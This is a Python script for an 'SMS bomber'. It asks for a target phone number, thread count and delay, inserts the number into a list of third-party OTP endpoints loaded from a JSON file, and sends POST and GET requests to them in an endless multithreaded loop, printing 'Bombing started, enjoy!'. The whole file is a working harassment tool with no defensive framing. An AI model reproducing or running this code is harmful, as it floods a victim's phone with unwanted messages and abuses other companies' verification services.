import json
import signal
import sys
from threading import Thread
from time import sleep
import requests
from colorama import Fore, Style


def handler(signum, frame):
    print("Terminating...")
    sys.exit()


def start_bombing(phone_number: str, targets: dict, delay: int):
    print(f"{Fore.GREEN}Bombing started, enjoy!{Style.RESET_ALL}")
    # POST requests

    targets["POST"][0]['body_param']['phone'] = phone_number
    targets["POST"][1]['body_param']['otpMobile'] = phone_number
    targets["POST"][2]['body_param']['Phonenumber'] = f"91{phone_number}"
    targets["POST"][3]['body_param']['username'] = phone_number
    targets["POST"][4]['body_param'] = targets["POST"][4]['body_param'].replace('phone_number', phone_number)
    targets["POST"][5]['body_param']['mobile'] = phone_number
    targets["POST"][6]['body_param']['phone_number'] = phone_number
    targets["POST"][len(targets["POST"]) - 1]["body_param"] = targets["POST"][len(targets["POST"]) - 1]["body_param"].replace('%{phone_number}%', phone_number)
    # GET requests
    targets["GET"][0]['url'] = targets["GET"][0]['url'].replace('%{phone_number}%', phone_number)
    targets["GET"][1]['url'] = targets["GET"][1]['url'].replace('%{phone_number}%', phone_number)
    targets["GET"][2]['url'] = targets["GET"][2]['url'].replace('%{phone_number}%', phone_number)

    while True:

        try:
            for i in range(len(targets["POST"])):
                requests.post(targets["POST"][i]['url'], headers=targets["POST"][i]['headers'],
                              data=targets["POST"][i]['body_param'])

            for j in range(len(targets["GET"])):
                requests.get(targets["GET"][j]['url'], headers=targets["GET"][j]['headers'])

        except requests.exceptions.ConnectionError:
            print(f"{Fore.RED}Connection error, please, check your internet connection{Style.RESET_ALL}")
        except requests.exceptions.ReadTimeout:
            print(f"{Fore.RED}Request took too long time{Style.RESET_ALL}")
        sleep(delay)


def main():
    file = open('./endpoints.json')
    data = json.load(file)

    phone_number = input("Target phone number (without country code): ")
    delay = float(input("Enter delay time (in seconds): "))
    number_of_threads = int(input("Enter number of threads: "))
    signal.signal(signal.SIGINT, handler)
    for nt in range(number_of_threads):
        thread = Thread(target=start_bombing, args=(phone_number, data, delay))
        thread.start()


if __name__ == '__main__':
    main()
